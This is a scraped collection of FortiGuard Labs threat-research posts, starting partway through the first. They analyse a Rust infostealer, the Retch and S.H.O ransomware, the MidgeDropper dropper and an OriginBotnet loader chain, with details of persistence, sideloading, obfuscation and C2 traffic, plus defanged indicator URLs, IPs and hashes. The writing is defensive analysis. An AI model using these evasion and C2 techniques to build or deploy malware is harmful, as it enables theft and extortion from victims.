and methods somewhat less useful. The fact that RUST is used already makes this threat actor different. However, this is not the only trait that makes this malware distinct. For persistence, a temporary file is created called “24rp.xml.” This file is used to create a scheduled task. Once the scheduled task is created, the .XML file is deleted. This technique assumes that the intended targets leave their computers on overnight so the malware can execute outside regular office hours when it is less likely to be noticed. Moreover, for even greater stealth, the malware can sleep for random amounts of time when performing its tasks. Next, we will refer back to Figure 2 for another indication of how this malware attempts to stay hidden. Notice the memo is dated August 8th. By examining its compile timestamp, we found that this malware was created the previous day. This short timeframe makes it virtually impossible to accidentally release the malware before the attack starts. Ultimately, the malware acts like an infostealer, gathering basic computer information and sending it to a C2 server. The following commands are executed: These commands suggest that the threat actor is still in the early stages of attempting to fully compromise its targets. The information being gathered from these commands could be used to tailor specific attacks for each infected target. This infostealer is unique because it also collects a list of environment variables and takes an extra step to check for any proxy servers in use. Figure 10. Checking for proxy If a proxy server is set, the malware understands how to route its traffic. The malware issues a POST request to send the encrypted information it stole to a C2 server owned by the threat actor, 78[.]135.73.140, through port 35667. Our telemetry found nothing too interesting with the C2 server itself. However, digging into the server uncovered additional information. Using data from PDNS and other records, the C2 server 78[.]135.73.140 does not seem to be a shared server. This suggests the threat actor has total control and setup of the server. With this assumption, we searched to discover more of the threat actor’s network infrastructure. Inside the /24 subnet alone, four additional servers were revealed: Using the August 8thdate on the memo as a starting point, we searched traffic going to these servers in the month prior. While we did not find significant amounts of traffic, we identified one IP address in Colombia that connected to the server 78[.]135.73.188 in July on a port commonly used for VPN for a substantial amount of time. If the threat actor wanted to hide their activity, using a VPN server under their control would accomplish the job. The Colombia IP address belongs to a cellular company, which suggests the user may have been using a mobile hotspot. If so, this may be the location of the attacker. The threat actor in this campaign uses a few advanced techniques, including RUST and after-hours execution, to help it stay under the radar and make analysis more difficult. The size of the network infrastructure also suggests this threat actor is not a run-of-the-mill malware developer but someone with access to resources. And the use of a geopolitical rule indicates that this threat actor is plugged in and knows how to target specific users. Fortinet customers are already protected from these malware samples through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the relevant samples with the following AV signatures: The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice. TheFortiGuard AntiVirusservice is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. 2A71BA3FEF819AB9FF3347CF71EEA37766B1E80FDBC1B53C83DD3B19CE71EBFD ARMENIAN_ACT_OF_AGGRESSION.pdf.html 17B3ACB560E979556207B8E7E41A086F6F147381E2FFD1CE672D663A526B1FB5 Armenian Aggression.zip 04725FB5A9E878D68E03176364F3B1057A5C54CCA06EC988013A508D6BB29B42 1.KARABAKH.jpg.lnk 35F2F7CD7945F43D9692B6EA39D82C4FC9B86709B18164AD295CE66AC20FD8E5 karabakh.jpg.msi 5327308FEE51FC6BB95996C4185C4CFCBAC580B747D79363C7CF66505F3FF6DB WindowsDefenderHealthcheck.exe https://dl[.]dropboxusercontent[.]com/scl/fi/zjxgh8ofdmfca8bpfntw9/karabakh.jpg.msi?rlkey=nidpjpx3ioigoq6qonibztwg4&dl=0 78[.]135.73.140 78[.]135.73.147 78[.]135.73.162 78[.]135.73.183 78[.]135.73.188 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. advanced malware,microsoft FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/threat-Actors-exploit-the-tensions-between-azerbaijan-and-armenia"
  },
  {
    "title": "Ransomware Roundup - Retch and S. H. O.",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Retch and S.H.O ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Retch is a new ransomware variant first discovered in mid-August 2023. It encrypts files on compromised machines and leaves two ransom notes asking victims to pay a ransom for file decryption. Information about the infection vector used by the Retch ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. Retch ransomware samples have been submitted to a public file scanning service from the following countries: Once the ransomware runs, it looks for and encrypts files with the following file extensions: .txt, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .jpeg, .png, .csv, .sql, .mdb, .sln, .php, .asp, .aspx, .html, .xml, .psd, .mp4, .7z, .rar, .m4a, .wma, .avi, .wmv, .d3dbsp, .zip, .sie, .sum, .ibank, .t13, .t12, .qdf, .gdb, .tax, .pkpass, .bc6, .bc7, .bkp .qic, .bkf, .sidn, .sidd, .mddata, .itl, .itdb, .icxs, .hvpl, .hplg, .hkdb,   .mdbackup, .syncdb, .gho, .cas, .svg, .map, .wmo, .itm, .sb, .fos .mov, .vdf, .ztmp .sis, .sid, .ncf,           .menu, .layout, .dmp, .blob, .esm, .vcf, .vtf, .dazip, .fpk, .mlx, .kf, .iwd, .vpk, .tor, .psk, .rim, .w3x,        .fsh, .ntl, .arch00, .lvl, .snx, .cfr, .ff, .vpp_pc, .lrf, .m2, .mcmeta, .vfs0, .mpqge, .kdb, .db0, .dba, .rofl,  .hkx, .bar, .upk, .das, .iwi, .litemod, .asset, .forge, .ltx, .bsa, .apk, .re4, .sav, .lbf, .slm, .bik, .epk,           .rgss3a, .pak, .big, .wallet, .wotreplay, .xxx, .desc, .py, .m3u, .flv, .js, .css, .rb, .p7c, .pk7, .p7b, .p12, .pfx, .pem, .crt, .cer, .der, .x3f, .srw, .pef, .ptx, .r3d, .rw2, .rwl, .raw, .raf, .orf, .nrw, .mrwref, .mef, .erf, .kdc, .dcr, .cr2, .crw, .bay, .sr2, .srf, .arw, .3fr, .dng, .jpe, .jpg, .cdr, .indd, .ai, .eps, .pdf, .pdd, .dbf, .mdf, .wb2, .rtf, .wpd, .dxg, .xf, .dwg, .pst, .accdb, .pptm, .xlk, .xlsb, .xlsm, .wps, .docm, .odb, .odc, .odm, .odp, .ods, .cs, .exe, .lnk, .mpeg, .mp3, .mkv, .divx, .ogg, .wav, .bat, .index, .flac, .vob, .mpg The following directories are excluded from file encryption: The ransomware adds a “.Retch” extension to encrypted files. It then drops a ransom note labeled \"Message.txt\" in every folder where files are encrypted. In the ransom note, the Retch attacker asks victims to pay Bitcoins worth 300 euros for file decryption. Due to the low ransom demand, Retch ransomware is likely used to target consumers rather than enterprises. As shown in Figure 2, the ransom message is available in French and English, leading us to believe that the Retch ransomware primarily targets French users. However, further investigation revealed that this isn't the case. We also discovered that the ransom note dropped on the Desktop differs from “Message.txt.” The ransom note left on the Desktop is labeled “HOW TO RECOVER YOUR FILES.txt” and asks victims to pay Bitcoin worth $1000 for file decryption. This ransom note has a different contact email address and includes the attacker’s Bitcoin wallet address. It turns out that the Retch ransomware was developed based on a publicly available ransomware source code that claims to be for educational purposes, which appears to be based on a well-known open-source ransomware, “HiddenTear.” The open-source ransomware has the ransom note shown in Figure 2 by default. The attacker appears to have only customized the ransom note on the desktop, which is only in English, leaving the ransom notes in all other locations untouched. This indicates that the Retch ransomware was not targeting French users as we first thought. As mentioned, the countries from which the files were submitted to the public file scanning service are widespread, further suggesting our suspicion is correct. At the time of our investigation, the attacker’s Bitcoin wallet had not recorded any transactions. Information about the infection vector used by the S.H.O ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. S.H.O ransomware samples have been submitted to a public file scanning service from the following countries: After the ransomware runs, it encrypts files on compromised machines and adds five random letters and numbers as a file extension. S.H.O attempts to encrypt files with the following extensions: .myd, .ndf, .qry, .sdb, .sdf, .tmd, .tgz, .lzo, .txt, .jar, .dat, .contact, .settings, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .jpg, .mka, .mhtml, .oqy, .png, .csv, .py, .sql, .indd, .cs, .mp3, .mp4, .dwg, .zip, .rar, .mov, .rtf, .bmp, .mkv, .avi, .apk, .lnk, .dib, .dic, .dif, .mdb, .php, .asp, .aspx, .html, .htm, .xml, .psd, .pdf, .xla, .cub, .dae, .divx, .iso, .7zip, .pdb, .ico, .pas, .db, .wmv, .swf, .cer, .bak, .backup, .accdb, .bay, .p7c, .exif, .vss, .raw, .m4a, .wma, .ace, .arj, .bz2, .cab, .gzip, .lzh, .tar, .jpeg, .xz, .mpeg, .torrent, .mpg, .core, .flv, .sie, .sum, .ibank, .wallet, .css, .js, .rb, .crt, .xlsm, .xlsb, .7z, .cpp, .java, .jpe, .ini, .blob, .wps, .docm, .wav, .3gp, .gif, .log, .gz, .config, .vb, .m1v, .sln, .pst, .obj, .xlam, .djvu, .inc, .cvs, .dbf, .tbi, .wpd, .dot, .dotx, .webm, .m4v, .amv, .m4p, .svg, .ods, .bk, .vdi, .vmdk, .onepkg, .accde, .jsp, .json, .xltx, .vsdx, .uxdc, .udl, .3ds, .3fr, .3g2, .accda, .accdc, .accdw, .adp, .ai, .ai3, .ai4, .ai5, .ai6, .ai7, .ai8, .arw, .ascx, .asm, .asmx, .avs, .bin, .cfm, .dbx, .dcm, .dcr, .pict, .rgbe, .dwt, .f4v, .exr, .kwm, .max, .mda, .mde, .mdf, .mdw, .mht, .mpv, .msg, .myi, .nef, .odc, .geo, .swift, .odm, .odp, .rar, .orf, .pfx, .p12, .pl, .pls, .safe, .tab, .vbs, .xlk, .xlm, .xlt, .xltm, .svgz, .slk, .tar.gz, .dmg, .ps, .psb, .tif, .rss, .key, .vob, .epsp, .dc3, .iff, .opt, .onetoc2, .nrw, .pptm, .potx, .potm,.pot, .xlw, .xps .xsd, .xsf, .xsl, .kmz, .accdr, .stm, .accdt, .ppam, .pps, .ppsm, .exe, .p7b, .wdb, .sqlite, .sqlite3, .dacpac, .zipx, .lzma, .z, .tar.xz, .pam, .r3d, .ova, .1c, .dt, .c, .vmx, .xhtml, .ckp, .db3, .dbc, .dbs, .dbt, .dbv, .frm, .mwb, .mrg, .txz, .mrg, .vbox, .wmf, .wim, .xtp2, .xsn, .xslt The following files are excluded in all directories: These directories are also excluded from having their contents encrypted: S.H.O encrypts each file using an RSA public key and the Microsoft “Rijndael Managed” C# library. Upon completing the encryption run, it replaces the Desktop wallpaper with its own that asks victims to find and read the file “readme.txt,” which is a ransom note. FortiGuard Labs has identified two S.H.O ransomware variants that leave different ransom notes. Although the ransom notes have different Bitcoin addresses belonging to the attacker, the ransom fee stays consistent at $200. The ransom messages have a very fearful and ominous tone that may be an attempt to scare victims into paying the ransom. Neither of the Bitcoin wallets was available at the time of our investigation. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Retch ransomware samples with the following AV signature: FortiGuard Labs detects the S.H.O ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. IOC IOC Type Note 46ccde0b58abeec8e3e62eed462bbf663efd4c0027c692210b2922a2217fcaac SHA2 Retch ransomware a928964f062125cc32863a361a0554939f391a2e54a614c9c20c441f638a2f20 SHA2 f7ab2da0e0ba7e0290b74fea2f0438de4ba3b460f99c4c869285edb9bff5b846 SHA2 79972890083f7e47a3a221bff96ba5229618355cba24b685cc08e7f5672b2b7a SHA2 d2b9de087fdc05071283cb162bd94bf6608ccc3e09ca3b9e7ccafffd13e084d0 SHA2 C:\\Users\\IlIlIlIlIlIlIlIl\\Desktop\\TEMPLATE AND MASTERS 09032023\\ransomware-master werkING for obfuscation\\Gendarmerie B.V.3\\obj\\Release\\teste25.pdb PDB Retch PDB String D:\\SEPTEMBER WORKS\\Gendarmerie ransomware-master_  one page Current Sun 08 12 23\\ransomware-master\\Gendarmerie B.V.3\\obj\\Debug\\Gendarmerie_300.pdb 907f6b56a13e377293fb142de08c023b2f75b7dc321ea6976868a99dac2ebdc3 SHA2 S.H.O ransomware dcff6ed7acfa665af1cc31a005ccfcbdb79614a6749af6b4c3ff29ef1774008d SHA2 tUsmRqlrj5UCBgSc7H35O5BwodM0FI9hbK1VBimv/pjcWj9uAPjjfkyX28MAH nPKlHhfqk7rG0N1cVf46VOqW2tPDF91kCQmB2PATst0yfz5hmQUkvazSid78f qwR43XwoQu4RwKmRxlzprZfHTTmiJP1zRyQlGOT7zrPWdS+3sdR9MkjBWl +nZUPBuRE7ApNSWt0M9M61P3psNkfDkEcaguzYkBv+ptpKRTTrK3ppstxhD KVdRuXOBlcZKNsiRciFOE8PdapN+8T0z7jOU9b5PE2vAeewKw5zOXwI6PDb DVEpRZHcXhNrcaKIXqO5OsXAi5/tGsk05QtEn/uBpzpQ== RSA Public Key S.H.O ransomware’s RSA Public Key Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-retch-and-sho"
  },
  {
    "title": "New MidgeDropper Variant",
    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium One of the most exciting aspects of malware analysis is coming across a family that is new or rare to the reversing community. Determining the function of the malware, who created it, and the reasons behind it become a mystery to solve. The previously unseen dropper variant we recently found, named MidgeDropper, has a complex infection chain that includes code obfuscation and sideloading, making it an interesting use case. Although we couldn’t obtain the final payload, this blog will still explore what makes this dropper tick. The initial infection vector was not available to FortiGuard Labs at the time of our investigation. However, we strongly suspect it to be a phishing e-mail because we have access to an RAR archive—!PENTING_LIST OF OFFICERS.rar—that would have been the likely attachment to an e-mail. Two files are in the !PENTING_LIST OF OFFICERS.rar archive: “Notice to Work-From-Home groups.pdf” and “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” (Figure 1). The “Notice to Work-From-Home groups.pdf” file is exactly what it appears to be: a PDF file. It contains an image of an error message that falsely indicates that the PDF document failed to load. It is designed to act as a decoy and shift the recipient’s attention to clicking on and executing the “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” file. Since file extensions are hidden by default in Windows, it is unlikely that anyone reviewing the contents would see the “.exe” and would instead assume they were opening another PDF file. At 6.7MB, the ”062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” file is large by malware delivery standards. This executable primarily functions as a dropper for the following stages of infection. The executable drops the files “Microsoft Office.doc,” “IC.exe,” “power.exe,” and “power.xml”. It also reaches out to “hXXp://185[.]225[.]68[.]37/jay/nl/seAgnt.exe” to pull down the file “seAgnt.exe.” This file is dropped and opened from “C:\\Users\\<user>\\AppData\\Local\\Temp\\Microsoft\\Office.” It is also meant to be a decoy. It is populated in some versions of the dropper, but it was empty and benign in the version analyzed by FortiGuard Labs. “IC.exe” is dropped by “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” and deposited into “C:\\ProgramData\\Emisoft\\Microsoft\\Stream\\IC.exe.” It is responsible for obtaining the next stage of the infection. “IC.exe” reaches out to a URL at “185[.]225[.]68[.]37” to download an additional file, “VCRUNTIME140_1.dll.” As can probably be guessed by the filename, “VCRUNTIME140_1.dll” is meant to appear as a file related to the Microsoft Visual C++ Redistributable Package. “power.exe” is dropped along with “power.xml” by ”062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe”.  “power.exe” only has one job: decoding and processing “power.xml.” Figure 9 shows that “power.xml” in its native format is obfuscated and not readily readable.  This can be easily rectified by removing the garbage characters used for obfuscation. With obfuscation removed, an XML document remains. Much of the information is irrelevant except for the final section under the “Actions” tag. The primary purpose of this pair of files is to launch “seAgnt.exe.” “seAgnt.exe” is a renamed copy of “GameBarFTServer.exe,” which is an application published by Microsoft, “Xbox Game Bar Full Trust COM Server.”  It is a background process for the Xbox Game Bar that runs on Windows. Although itself benign, “seAgnt.exe” does depend on “VCRUNTIME140_1.dll”.  This dependency allows the malicious code inside of the DLL to execute. “VCRUNTIME140_1.dll” is a legitimate DLL that is part of the Microsoft Visual C++ runtime package. Unfortunately, the particular version used here is malicious. Due to “VCRUNTIME140_1.dll” being a Dynamic Link Library, it doesn’t exist as a separate executable. It has to have assistance via another application to load its code into memory and execute it. “seAgnt.exe” is that application. This technique is called sideloading (https://attack.mitre.org/techniques/T1574/002/) because a dependency of a legitimate application is highjacked to allow the malicious code to load. The file is heavily obfuscated and designed to make analysis much more difficult. For example, the figure below shows the massive number of function jumps that attempt to hide the purpose of the code. The rest of the code makes it equally difficult to follow along in a disassembler. The primary purpose of the code appears to be reaching out to “hXXp://185[.]225[.]68[.]37/jay/nl/35g3498734gkb.dat” to pull down the file “35g3498734gkb.dat”. Oddly, “35g3498734gkb.dat” is identical to “VCRUNTIME140_1.dll” in terms of the file hash, so it’s unclear why the threat actor opted to pull it down again from the C2 node. Unfortunately, further links on the infection chain were taken down when our analysis began, preventing further analysis of any potential final payloads. Despite the final payload being unavailable before FortiGuard Labs could analyze it, this dropper made an interesting case study and provided a subject to watch out for. Fortinet customers are already protected from this malware through FortiGuard’sWeb Filtering,AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Filename SHA256 !PENTING_LIST OF OFFICERS.rar 2dcf00b0f6c41c2c60561ca92893a0a9bf060e1d46af426de022d0c5d23d8704 Notice to Work-From-Home groups.pdf 30417ca261eefe40f7c44ff956f9940b766ae9a0c574cd1c06a4b545e46f692e 062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe c22cc7111191e5a1a2010f4bc3127058bff41ecba8d753378feabee37d5b43bb Microsoft Office.doc 59334a6e2c5faabe3a1baf5347ba01f2419d731fcbb7ab1b021185c059c8fa6f IC.exe fc40e782731b8d3b9ec5e5cf8a9d8b8126dc05028ca58ec52db155b3dadc5fc6 power.exe f26f5a52bddda5eb3245161b784b58635ffa2381818816e50b8bae9680ff88eb power.xml f43cca8d2e996ee78edf8d9e64e05f35e94a730fbe51e9feecc5e364280d8534 seAgnt.exe b3e0388f215ac127b647cd7d3f186f2f666dc0535d66797b6e1adb74f828254e VCRUNTIME140_1.dll / 35g3498734gkb.dat 527afa0c415af005594acaac1093a1ea79e3639fa5563602497eabbae7438130 IOC IOC type 185[.]225[.]69[.]226 C2 Node hXXp://185[.]225[.]68[.]37/jay/nl/VCRUNTIME140_1.dll Stage download location hXXp://185[.]225[.]68[.]37/jay/nl/seAgnt.exe Stage download location hXXp://185[.]225[.]68[.]37/jay/nl/35g3498734gkb.dat Stage download location FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/new-midgedropper-variant"
  },
  {
    "title": "OriginBotnet Spreads via Malicious Word Document",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrencySeverity level:Critical In August, FortiGuard Labs obtained a Word document containing a malicious URL designed to entice victims to download a malware loader. This loader employs a binary padding evasion strategy that adds null bytes to increase the file's size to 400 MB. The payloads of this loader include OriginBotnet for keylogging and password recovery, RedLine Clipper for cryptocurrency theft, and AgentTesla for harvesting sensitive information. Figure 1 illustrates the comprehensive attack flow. In this blog, we examine the various stages of how the file is deployed and delve into the specifics of the malware it delivers. Aphishingemail delivers the Word document as an attachment, presenting a deliberately blurred image and a counterfeit reCAPTCHA (Figure 2) to lure the recipient into clicking on it. Clicking activates an embedded malicious link in the file “\\word_rels\\document.xml.rels,” as shown in Figure 3. The initial loader was acquired from https://bankslip[.]info/document/scancop20233108[.]exe. This file, written in .NET, deciphers the “Main_Project” resource data in “HealthInstitutionSimulation.Properties.Resources.resources.” It uses an XOR operation with the string “WdxDFWxcf09WXfVVjLwKKcccwnawf” and then 'Activator.CreateInstance()' to execute the decoded information. The decoding procedure is shown in Figure 4. The second stage uses the “Main Project.dll” with the entry point illustrated in Figure 5. In this stage, the code initiates a “Sleep()” function within “Delation()” and establishes persistence through the “Moschop()” function. It then loads Base64-encoded strings and uses the AES-CBC algorithm for decryption, retrieving a PowerShell command, as shown in Figure 6. To ensure persistence, it duplicates the EXE file into the directory “%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” under the filename “audacity.exe.exe” to ensure that the file runs automatically even if the victim restarts their device. Following that, it employs the command “GetType(‘I.L’).GetMethod(‘U’)” to invoke a method from the DLL that was decrypted from the resources labeled “DataPresent.” This is passed to the third-stage payload, decrypted from the data within the resources labeled “Moss,” using the AES-ECB algorithm, as shown in Figure 7. The third stage uses “scancopper4647979413.exe,” which is another .NET executable file. It utilizes the “Activator.CreateInstance()” method to generate an instance decoded from the resources, “rumdisintegration.dat,” effectively triggering the execution of the fourth-stage file, “cargomind.dll.” It then uses the “CreateInstance()” method with two parameters: the object type for instantiation and an array of arguments to be transmitted to the created object. The fourth stage is represented by a DLL file, “cargomind.dll.” Its entry point is shown in Figure 9. It comprises three Base64-encoded strings intended for subsequent operations. The “Deserialize()” function, as shown in Figure 10, is responsible for decoding these strings, parsing the key-value pairs for each option, and ultimately returning a dictionary. Figure 11 displays the result obtained from “list2.” It reveals the existence of three tasks, each comprising six distinct options. Let's explore the options within “list2[0]” in detail: For the remaining two tasks in “list2,” the action is set to “b.” Consequently, it invokes the “ExecuteBinder()” function to decode data specified in the “r_k” option, as shown in Figure 14. The targeted files in this context are “newcrisp.dat” and “backyard.dat,” both sourced from the resources section of the prior stage, “scancopper46477979413.exe,” as shown in Figure 15. The initial malware originates from the URL https://softwarez[.]online/javau[.]exe. It is a .NET executable file that has been packed using SmartAssembly. Upon deciphering the resource data, we uncovered the ultimate payload, “RedLine Clipper,” as shown in Figure 16. RedLine Clipper (SHA256: 4617631b4497eddcbd97538f6712e06fabdb53af3181d6c1801247338bffaad3), also known as ClipBanker, specializes in stealing cryptocurrencies by manipulating the user's system clipboard activities to substitute the destination wallet address with one belonging to the attacker. The compromised version (Figure 17) supports cryptocurrencies, including Bitcoin, Ethereum, Dogecoin, Litecoin, Dashcoin, and Monero. It continually monitors the clipboard for a copied coin wallet address, which is typically lengthy and complex, making manual entry impractical. When a wallet address is detected on the clipboard, RedLine Clipper covertly alters it to match the attacker's wallet address. Ordinarily, cryptocurrency wallet addresses adhere to specific formats, but due to their complexity, users often copy and paste them during transactions. Consequently, if the wallet address is tampered with at this stage, users intending to send funds to a particular wallet may inadvertently deposit them into the attacker's wallet instead. To carry out this operation, RedLine Clipper utilizes the “OnClipboardChangeEventHandler” to regularly monitor clipboard changes and verify if the copied string conforms to the regular expression depicted in Figure 18. It's worth noting that the attacker targets all six supported cryptocurrencies in this scheme. The second file, an Agent Tesla variant, is stored as “COPPER.exe” (SHA256: c241e3b5d389b227484a8baec303e6c3e262d7f7bf7909e36e312dea9fb82798). This malware can log keystrokes, access the host's clipboard, and conduct disk scans to uncover credentials and other valuable data. Further, it can transmit gathered information to its Command and Control (C2) server through various communication channels, including HTTP(S), SMTP, FTP, or even dispatching it to a designated Telegram channel. To ensure its persistence, the malware replicates itself to the location “%AppData%\\EbJgI\\EbJgI.exe” and establishes itself as an auto-run entry within the system registry, as shown in Figure 20. Additionally, it compiles a list of specific software installed on the victim's device, including web browsers, email clients, FTP clients, and more, as shown in Figure 21. This specific version of Agent Tesla employs SMTP as its C2 connection protocol. You can see the details of the traffic session in Figure 22. The third file, OriginBotnet, is stored as “david.exe” (SHA256: be915d601276635bf4e77ce6b84feeec254a900c0d0c229b0d00f2c0bca1bec7). It is named after its namespace, as seen in Figure 23. OriginBotnet has a range of capabilities, including collecting sensitive data, establishing communications with its C2 server, and downloading additional files from the server to execute keylogging or password recovery functions on compromised devices. Initially, OriginBotnet scans running processes to determine if it is already active within the environment. It then initializes its settings and gathers essential information about the victim’s device, such as the installed AntiVirus Product, CPU, GPU, country, OS name, and username, as shown in Figure 25. Once the system information has been collected, the malware connects with the C2 server at https://nitrosoftwares[.]shop/gate. Figure 26 shows the function responsible for transmitting messages. The communication is conducted via a POST request using a parameter named “p.” The POST data is subjected to TripleDES encryption (in ECB mode, with PKCS7 padding) and subsequently encoded in Base64 format. The encryption key for TripleDES is stored within the “x-key” field of the HTTP Header. Additionally, the Content-Type and User-Agent values are hard-coded as “application/x-www-form-urlencoded” and “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0,” respectively. Figures 27 and 28 provide insights into the traffic capture and decrypted message. After receiving an “OK” signal from the C2 server, OriginBotnet enters a waiting state and proceeds to parse incoming C2 commands. The process for handling these commands is outlined in Figure 28. The available commands include “downloadexecute,” “uninstall,” “update,” and “load.” If the victim receives either the “downloadexecute” or “update” command, the malware proceeds to parse additional parameters, including the URL. It then directly downloads supplementary files from the specified URL and executes them. It selects the appropriate execution method depending on the file’s extension (.exe, .msi, or .java). This may involve using “Process.Start” or invoking commands such as “msiexec.exe /I” or “java.exe -jar,” as shown in Figure 30. When receiving an “uninstall” command, OriginBotnet invokes “MoveFile” to relocate the file to a temporary folder. The final command, “load,” retrieves plugins from the C2 server. The POST session and the decoded data for this specific request are displayed in Figure 31. In this context, two plugins are available for OriginBotnet: Keylogger and PasswordRecovery. The plugin DLL file is transmitted as a Base64 encoded string within the “bytes” parameter. The processing function for this operation is shown in Figure 32. The Keylogger plugin (SHA256: c204f07873fafdfd48f37e7e659e3be1e4202c8f62db8c00866c8af40a9a82c5) is designed to covertly record and log each keystroke executed on a computer as well as monitor user activities. It employs techniques such as “SetWindowsHookEx” for capturing keyboard input events and “GetForegroundWindow” to determine the active window the user is working in. It also keeps tabs on clipboard text content through “SetClipboardViewer.” The stolen text file uses a format similar to Agent Tesla's, as shown in Figure 35. The PasswordRecovery plugin (SHA256: 56ced4e1abca685a871b77fab998766cbddfb3edf719311316082b6e05986d67) retrieves and organizes the credentials of various browser and software accounts. It records these results and reports them via HTTP POST requests. Its primary function is shown in Figure 36. The plugin is designed to target the following browsers and software applications: This cyberattack campaign uncovered by FortiGuard Labs involved a complex chain of events. It began with a malicious Word document distributed via phishing emails, leading victims to download a loader that executed a series of malware payloads. These payloads included RedLine Clipper, Agent Tesla, and OriginBotnet. The attack demonstrated sophisticated techniques to evade detection and maintain persistence on compromised systems. We also provided a comprehensive breakdown of each attack stage, shedding light on the intricacies of the deployed malware and the tactics employed. The malware described in this report are detected and blocked byFortiGuard Antivirusas: MSOffice/Agent.DA32!tr.dldrMSIL/Agent.8DF3!trMSIL/Agent.DGH!trMSIL/Agent.F!tr.spyMSIL/Agent.CSS!tr.spyMSIL/Kryptik.AHUA!trMSIL/Kryptik.PSV!trMSIL/Injector.WGW!trMSIL/Injector.WHL!trMSIL/ClipBanker.PK!trMSIL/Keylogger.ELM!trMSIL/OriginBotnet.G!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard 